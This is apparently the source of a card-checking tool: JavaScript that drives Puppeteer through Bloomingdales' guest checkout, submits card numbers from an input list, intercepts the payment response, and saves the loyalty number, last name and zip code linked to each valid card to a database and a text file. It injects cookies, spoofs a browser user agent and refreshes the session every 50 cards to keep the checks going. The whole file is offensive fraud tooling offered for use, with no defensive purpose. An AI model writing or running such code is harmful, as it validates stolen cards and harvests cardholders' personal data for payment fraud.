const puppeteer = require('puppeteer');
const fs = require('fs');
const Datastore = require('nedb')
const checkCardNumberHelper = require('../helper/bloom/checkCard');
const utilsHelper = require('../helper/utils');
const cardNumberDb = new Datastore({
    filename: 'database/cardNumber.db',
    autoload: true
});

const autoSave = () => {
    cardNumberDb.find({
        success: true
    }, {
        "_id": 0,
        "cardNumber": 0,
        "success": 0,
        "checked": 0
    }, (err, doc) => {
        let output = '';
        doc.forEach(element => {
            if (element.loyaltyNumber)
                output += Object.values(element).join('|') + "\n";
        });

        let stream = fs.createWriteStream("cardNumber.txt");

        stream.once('open', function (fd) {
            stream.write(output);
            stream.end();
        });
    });
}
autoSave()
setInterval(autoSave, 10000);



window.onload = () => {

    cardNumberDb.find({
        success: true
    }, {
        "_id": 0,
        "cardNumber": 0,
        "success": 0,
        "checked": 0
    }, (err, doc) => {
        let listOuputRestore = '#listOuputRestore';
        doc.forEach(element => {
            if (element.loyaltyNumber)
                $(listOuputRestore).append(Object.values(element).join('|') + "\n");
        });
    });

    document.querySelector('#btnStart').addEventListener('click', async () => {


        let cookiesJson = $("#listInputCookie").val();

        if (!utilsHelper.IsJsonString(cookiesJson)) {
            alert("Cookie not Json");
            return false;
        }

        let showBrowser = $('#checkboxShowBrowser').is(":checked");
        if (showBrowser) showBrowser = false
        else showBrowser = true

        let buttonElement = '#btnStart';
        let buttonDefaultText = $(buttonElement).text();

        $(buttonElement).html('<i class="fa fa-spinner fa-spin" style="font-size:20px"></i> Proccessing..');
        $(buttonElement).prop("disabled", true);

        let elementOutput = "#listOuput";
        let elementproccessingAll = "#proccessingAll";
        let elementproccessingCurrent = "#proccessingCurrent";


        let cookies = JSON.parse($("#listInputCookie").val());
        let listCardNumber = $("#listInputMain").val().trim().replace(/^\s*\n/gm, "").split('\n');

        $(elementOutput).text('');
        $(elementproccessingCurrent).text(0);
        $(elementproccessingAll).text(listCardNumber.length);


        let showResult = (resultCheckCard) => {

            if (resultCheckCard.success && resultCheckCard.loyaltyNumber) {
                let dataExport = {
                    loyaltyNumber: resultCheckCard.loyaltyNumber,
                    lastName: resultCheckCard.lastName,
                    zipCode: resultCheckCard.zipCode,
                }

                $(elementOutput).append(Object.values(dataExport).join('|') + "\n");
            }
        }

        let cookiesBuilder = await checkCardNumberHelper.bloomBuildCheckCard(showBrowser);

        let modePuppeteer = {
            headless: showBrowser,
            executablePath: utilsHelper.getChromiumExecPath()
        };


        let browser = await puppeteer.launch(modePuppeteer);
        let page = (await browser.pages())[0];

        await page.setUserAgent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36");



        await page.setCookie(...cookiesBuilder);

        let countCheckCard = 1;
        await page.setViewport({
            width: 1366,
            height: 768
        });


        page.on('response', (res) => {
            if (res.url() == "https://www.bloomingdales.com/chkout/rcpayment/continuecheckout") {

                res.text().then(result => {

                    let dataRequest = JSON.parse(res.request()['_postData']);

                    let resultCheckCardJSON = JSON.parse(result)

                    let resultCheckCardExtract = {
                        success: false,
                        checked: true,
                        cardNumber: dataRequest.creditCard.cardNumber,
                        loyaltyNumber: "",
                        lastName: "",
                        zipCode: "",
                    }

                    if (resultCheckCardJSON.responsivePayment.loyaltyAccountInfo) {
                        resultCheckCardExtract.success = true;

                        resultCheckCardExtract.loyaltyNumber = resultCheckCardJSON.responsivePayment.loyaltyAccountInfo.loyaltyNumber;

                        resultCheckCardExtract.lastName = resultCheckCardJSON.responsivePayment.loyaltyAccountInfo.lastName;

                        resultCheckCardExtract.zipCode = resultCheckCardJSON.responsivePayment.loyaltyAccountInfo.zipCode;
                    }

                    console.log(resultCheckCardExtract);

                    cardNumberDb.insert(resultCheckCardExtract);
                    showResult(resultCheckCardExtract);


                }).catch(result => {

                })
            }

        });

        await page.goto("https://www.bloomingdales.com/chkout/startguestcheckout?bypass_redirect=true").catch(() => {

        });
        await page.waitFor(10000);
        let lastCookies = await page.cookies();



        await utilsHelper.asyncForEach(listCardNumber, async (cardNumber) => {

            let cardNumberSaved = await new Promise((resolve, reject) => {
                cardNumberDb.find({
                    cardNumber: cardNumber
                }, {
                    "_id": 0
                }, (err, doc) => {
                    resolve(doc)
                });
            });


            let resultCheckCard = {};

            if (await !cardNumberSaved[0]) {

                if (countCheckCard && countCheckCard % 50 == 0) {
                    let cookiesBuilderRenew = await checkCardNumberHelper.bloomBuildCheckCard(showBrowser);
                    await page.setCookie(...cookiesBuilderRenew);
                    await page.goto("https://www.bloomingdales.com/chkout/startguestcheckout?bypass_redirect=true").catch(() => {});
                }

                resultCheckCard = await checkCardNumberHelper.checkCard(page, cardNumber);

                countCheckCard++;
            } else {
                resultCheckCard = await cardNumberSaved[0];
            }

            showResult(resultCheckCard);

            $(proccessingCurrent).text(Number($(elementproccessingCurrent).text()) + 1);
        })

        await browser.close();

        $(buttonElement).removeAttr('disabled');
        $(buttonElement).hide().text(buttonDefaultText).fadeIn();

    })
};